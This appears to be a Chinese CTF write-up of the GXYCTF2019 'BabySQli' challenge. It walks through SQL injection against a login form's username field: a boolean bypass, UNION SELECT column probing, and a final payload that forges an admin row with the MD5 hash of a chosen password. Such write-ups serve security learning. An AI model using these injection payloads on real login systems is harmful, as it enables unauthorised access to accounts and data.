# [GXYCTF2019]BabySQli
![](<./img/Pasted image 20221106111400.png>)

![](<./img/Pasted image 20221106111412.png>)

抓包发现通过`POST`方法传递用户名和密码

![](<./img/Pasted image 20221106111504.png>)

响应包中有一串`base32`码

![](<./img/Pasted image 20221106111611.png>)

![](<./img/Pasted image 20221106111649.png>)

套娃.jpg

![](<./img/Pasted image 20221106111726.png>)

看来是对用户名进行注入
```sql
name=1' or 1=1 or '1&pw=password
```
![](<./img/Pasted image 20221106112051.png>)

尝试判断注入点
```sql
name=1' union select 1,2,3#&pw=password
```
![](<./img/Pasted image 20221106113404.png>)
```sql
name=1' union select 'admin',2,3#&pw=password
```
```sql
name=1' union select 1,'admin',3#&pw=password
```
```sql
name=1' union select 1,2,'admin'#&pw=password
```
发现注入点为第二列

猜测`password`为第三列
```sql
name=1' union select 1,'admin','1'#&pw=1
```
![](<./img/Pasted image 20221106114926.png>)

搜索后才知道用的`md5`编码，属实没想到QAQ
```sql
name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1
```
![](<./img/Pasted image 20221106115057.png>)
